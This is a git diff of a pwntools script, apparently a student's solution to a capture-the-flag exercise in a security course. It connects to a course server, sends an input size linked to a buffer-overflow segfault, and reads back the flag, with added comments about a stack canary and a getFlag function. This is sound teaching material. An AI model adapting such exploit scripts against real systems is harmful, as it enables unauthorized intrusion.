@@ -3,10 +3,14 @@
 from pwn import *
 from pwn import p64
 
+
+
 io = remote('inf226.puffling.no', 7002)
 
 io.recvuntil(b'? ')
-io.sendline(b'24') 
+# because if I input junk of size 24, I get seg. fault
+# i.e. the 'carrying capacity' is 24
+io.sendline(b'24')
 
 r = io.recvline()
 prompt = b"Here's a hint: "
@@ -20,6 +24,18 @@ recieved = io.recvall().decode()
 flag = recieved.splitlines()[-2]
 print(f'Flag 02: {flag}')
 
+
+
+
+
+'''
+Again, a function getFlag is responsible for surrendering
+the flag. 
+- There is a canary
+- 
+
+
+'''
 
 
 
